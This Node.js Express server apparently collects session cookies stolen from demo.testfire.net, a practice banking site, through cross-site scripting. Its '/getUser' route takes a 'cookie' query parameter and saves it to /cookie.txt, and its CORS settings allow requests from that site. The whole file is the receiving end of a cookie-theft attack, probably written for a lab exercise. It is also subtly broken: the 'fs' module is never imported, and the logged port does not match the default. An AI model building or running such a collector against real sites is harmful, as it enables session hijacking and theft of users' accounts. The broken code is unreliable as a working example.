const express = require('express'); 
const bodyParser = require('body-parser');
const router = express.Router();
const app = express();
var cors = require('cors');


var corsOptions = {
  origin: 'https://demo.testfire.net',
  optionsSuccessStatus: 200 
} 

app.use(bodyParser.json());      
app.use(bodyParser.urlencoded({extended: true}));
app.use(express.static(__dirname + '/views'));
   
router.get('/',(req,res) => {
    res.sendFile('index.html');
});

router.get('/getUser', cors(corsOptions) ,(req,res) => {
    var cookie = req.query.cookie;
    console.log(req.body);
    fs.writeFile("/cookie.txt", cookie, function(err) {

        if(err) {
            return console.log(err);
        }
    
        console.log(cookie);
        res.end();
    });  
});
 

app.use('/', router);

app.listen(process.env.PORT || 8080,() => {
    console.log(`App Started on PORT ${process.env.PORT || 3000}`);
});